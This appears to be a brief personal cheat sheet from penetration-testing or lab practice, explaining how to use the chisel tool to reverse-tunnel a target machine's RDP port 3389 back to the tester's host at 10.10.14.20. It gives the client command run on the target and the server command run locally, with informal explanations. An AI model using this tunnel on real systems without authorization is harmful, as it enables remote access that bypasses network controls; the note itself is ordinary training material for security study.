on the target machine:

./chisel client 10.10.14.20:4646 R:3389:localhost:3389

what this command is doing:
	- client arg is forward the connection to your ip and port you want to listen on
	- R:3389:localhost:3389 ~ this is the localhost port that you want the connection to tunnel to
	  so to explain it more clearly it is tunneling the port 3389 onto your machine locally
	
on your machine:

./chisel server -p 4646 --reverse
	
what this command is doing
	- this is catching the connection being forwarded by the target machine on your yours
 	- once you run this command you should now have port 3389 open on your machine
	- THIS IS PROBABLY A SHITTY WAY OF DESCRIBING CHISEL AND TUNNELING
	- I recommend looking up a clearer definition online
